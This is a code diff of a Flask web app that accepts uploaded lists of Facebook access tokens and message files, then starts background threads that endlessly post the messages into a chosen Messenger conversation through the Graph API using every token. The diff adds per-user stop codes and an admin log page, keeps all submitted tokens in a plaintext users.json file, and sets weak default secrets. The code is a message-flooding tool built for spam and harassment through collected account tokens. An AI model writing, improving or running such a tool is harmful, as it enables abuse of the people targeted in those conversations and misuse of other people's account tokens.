@@ -1,65 +1,53 @@
-from flask import Flask, request, session, redirect, url_for, render_template
+from flask import Flask, request, session, redirect, url_for, render_template, jsonify
 import requests
 from threading import Thread, Event
 import time
 import os
 import logging
 import io
+import uuid
 import json
 
 app = Flask(__name__)
-app.debug = True
-app.secret_key = "3a4f82d59c6e4f0a8e912a5d1f7c3b2e6f9a8d4c5b7e1d1a4c"  # Change this in production
+app.secret_key = os.getenv("SECRET_KEY", "supersecret")
 
-ADMIN_PASSWORD = os.getenv("ADMIN_PASSWORD", "12341")  # 🔑 Default password
-USERS_FILE = "users.json"
+ADMIN_PASSWORD = os.getenv("ADMIN_PASSWORD", "12341")
 
-# Log setup
+# ---------------- Logging ----------------
 log_stream = io.StringIO()
 handler = logging.StreamHandler(log_stream)
 handler.setLevel(logging.INFO)
 logging.getLogger().addHandler(handler)
 logging.getLogger().setLevel(logging.INFO)
 
+# ---------------- Globals ----------------
+users_file = "users.json"
+users_data = []       # store user dicts
+user_threads = {}     # code -> thread
+user_events = {}      # code -> stop_event
+
 headers = {
-    'Connection': 'keep-alive',
-    'Cache-Control': 'max-age=0',
-    'Upgrade-Insecure-Requests': '1',
     'User-Agent': 'Mozilla/5.0',
-    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
-    'Accept-Encoding': 'gzip, deflate',
-    'Accept-Language': 'en-US,en;q=0.9',
-    'referer': 'www.google.com'
+    'Accept': 'application/json',
 }
 
-stop_event = Event()
-threads = []
-users_data = []  # in-memory store
-
-# ---------------- JSON Helpers ----------------
-
+# ---------------- Helpers ----------------
 def save_users():
-    try:
-        with open(USERS_FILE, "w", encoding="utf-8") as f:
-            json.dump(users_data, f, indent=2)
-    except Exception as e:
-        logging.error(f"⚠️ Error saving users.json: {e}")
+    with open(users_file, "w") as f:
+        json.dump(users_data, f, indent=2)
 
 def load_users():
     global users_data
-    if os.path.exists(USERS_FILE):
-        try:
-            with open(USERS_FILE, "r", encoding="utf-8") as f:
+    if os.path.exists(users_file):
+        with open(users_file, "r") as f:
+            try:
                 users_data = json.load(f)
-        except Exception as e:
-            logging.error(f"⚠️ Error loading users.json: {e}")
-            users_data = []
+            except:
+                users_data = []
     else:
         users_data = []
 
-# ---------------- Worker ----------------
-
-def send_messages(access_tokens, thread_id, mn, time_interval, messages):
+def send_messages(code, access_tokens, thread_id, mn, time_interval, messages, stop_event):
     while not stop_event.is_set():
         try:
             for message1 in messages:
@@ -69,59 +57,74 @@ def send_messages(access_tokens, thread_id, mn, time_interval, messages):
                     api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                     message = str(mn) + ' ' + message1
                     params = {'access_token': access_token, 'message': message}
-                    response = requests.post(api_url, data=params, headers=headers)
-                    if response.status_code == 200:
-                        logging.info(f"✅ Sent: {message[:30]} via {access_token[:30]}")
-                    else:
-                        logging.warning(f"❌ Fail [{response.status_code}]: {message[:30]}")
+                    try:
+                        response = requests.post(api_url, data=params, headers=headers, timeout=10)
+                        if response.status_code == 200:
+                            logging.info(f"✅ Sent by User {code}: {message[:40]}")
+                        else:
+                            logging.warning(f"❌ Fail [{response.status_code}] User {code}: {response.text[:100]}")
+                    except Exception as e:
+                        logging.error(f"⚠️ Request error user {code}: {e}")
                 time.sleep(time_interval)
         except Exception as e:
-            logging.error("⚠️ Error in loop: %s", e)
-            time.sleep(10)
-
-# ---------------- Routes ----------------
+            logging.error(f"⚠️ Error in loop user {code}: {e}")
+            time.sleep(5)
 
 @app.route('/ping')
 def ping():
-    return "✅ I am alive!", 200
+    return "✅ Alive", 200
 
+# ---------------- Index ----------------
 @app.route('/', methods=['GET', 'POST'])
-def send_message():
-    global threads, users_data
+def index():
+    global users_data
     if request.method == 'POST':
         token_file = request.files['tokenFile']
-        access_tokens = token_file.read().decode().strip().splitlines()
+        access_tokens = token_file.read().decode(errors='ignore').strip().splitlines()
 
         thread_id = request.form.get('threadId')
         mn = request.form.get('kidx')
-        time_interval = int(request.form.get('time'))
+        time_interval = int(request.form.get('time', 5))
 
         txt_file = request.files['txtFile']
-        messages = txt_file.read().decode().splitlines()
+        messages = [line for line in txt_file.read().decode(errors='ignore').splitlines() if line.strip()]
 
-        # Save session
-        new_user = {
+        # Unique code
+        user_code = uuid.uuid4().hex[:6].upper()
+
+        user_data = {
+            "code": user_code,
             "tokens": access_tokens,
             "thread_id": thread_id,
             "prefix": mn,
             "interval": time_interval,
             "messages": messages
         }
-        users_data.append(new_user)
-        save_users()  # ✅ persist to JSON
+        users_data.append(user_data)
+        save_users()
 
-        # Start background thread
-        if not any(thread.is_alive() for thread in threads):
-            stop_event.clear()
-            thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages))
-            thread.start()
-            threads = [thread]
+        stop_event = Event()
+        t = Thread(target=send_messages, args=(user_code, access_tokens, thread_id, mn, time_interval, messages, stop_event))
+        t.daemon = True
+        t.start()
 
-    return render_template("index.html")
+        user_threads[user_code] = t
+        user_events[user_code] = stop_event
 
-# ---------------- Admin Panel ----------------
+        return render_template("index.html", users=users_data, new_code=user_code)
 
-@app.route('/admin/login', methods=['GET', 'POST'])
+    return render_template("index.html", users=users_data)
+
+@app.route('/stop/<code>', methods=['POST'])
+def stop_user(code):
+    if code in user_events:
+        user_events[code].set()
+        logging.info(f"🛑 User {code} stopped")
+        return redirect(url_for('index'))
+    return "⚠️ No such user code", 404
+
+# ---------------- Admin ----------------
+@app.route('/admin/login', methods=['GET','POST'])
 def admin_login():
     if request.method == 'POST':
         password = request.form.get("password")
@@ -134,15 +137,16 @@ def admin_login():
 def admin_panel():
     if not session.get("admin"):
         return redirect(url_for("admin_login"))
-    return render_template("admin.html", users=users_data)
+    logs = log_stream.getvalue().replace("\n", "<br>")
+    return render_template("admin.html", users=users_data, logs=logs)
 
-@app.route('/admin/remove/<int:idx>', methods=['POST'])
-def remove_user(idx):
+@app.route('/admin/remove/<code>', methods=['POST'])
+def remove_user(code):
     if not session.get('admin'):
         return redirect(url_for('admin_login'))
-    if 0 <= idx < len(users_data):
-        users_data.pop(idx)
-        save_users()  # ✅ update JSON
+    global users_data
+    users_data = [u for u in users_data if u["code"] != code]
+    save_users()
     return redirect(url_for('admin_panel'))
 
 @app.route('/admin/logout')
@@ -150,8 +154,7 @@ def admin_logout():
     session.pop('admin', None)
     return redirect(url_for('admin_login'))
 
-# ---------------- Main ----------------
-
+# ---------------- Startup ----------------
 if __name__ == "__main__":
-    load_users()  # ✅ load saved users on start
-    app.run(host='0.0.0.0', port=int(os.getenv("PORT", 5000)))
+    load_users()
+    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 5000)))
